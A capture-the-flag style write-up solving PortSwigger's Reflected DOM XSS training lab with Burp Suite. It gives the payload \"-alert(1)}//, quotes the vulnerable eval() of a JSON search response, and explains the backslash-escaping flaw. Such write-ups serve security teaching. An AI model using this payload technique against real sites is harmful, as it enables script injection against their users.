### Manual writeup reflected dom xss

# Manual Solution Using Burp Suite Community

## Lab

**Reflected DOM XSS**

> **Note:** Replace the lab URL below with your own PortSwigger Web Security Academy lab instance.

### Search Page

```text
https://0aa0001703e22861807cc69c00e6006e.web-security-academy.net/
```

### Injection Point

```text
Search parameter
```

### Payload

```text
\"-alert(1)}//
```

### Relevant JavaScript

The search functionality loads search results from a JSON response and processes them using the following code:

```javascript
eval('var searchResultsObj = ' + this.responseText);
```

Because the JSON response is passed directly to `eval()`, and backslashes are not properly escaped, it is possible to break out of the JSON string and execute arbitrary JavaScript.

### Result

1. Enable **Intercept** in Burp Suite.
2. Browse to the lab and search for a random value (for example, `XSS`).
3. Forward the intercepted request.
4. Observe that the search term is reflected in the `search-results` JSON response.
5. Review the `searchResults.js` file and identify the unsafe use of:

```javascript
eval('var searchResultsObj = ' + this.responseText);
```

6. Submit the following search term:

```text
\"-alert(1)}//
```

The payload escapes the JSON context and executes `alert(1)`, solving the lab.

---

## Why It Works

The application evaluates attacker-controlled JSON using JavaScript's `eval()` function.

Although quotation marks are escaped, backslashes are not. This allows an attacker to escape the JSON string and inject arbitrary JavaScript, resulting in a reflected DOM-based Cross-Site Scripting (DOM XSS) vulnerability.

---

## Python Implementation

The accompanying Python script:

- Sends the malicious search request.
- Verifies that the payload is reflected in the response.

```text
reflected-dom-xss.py
```
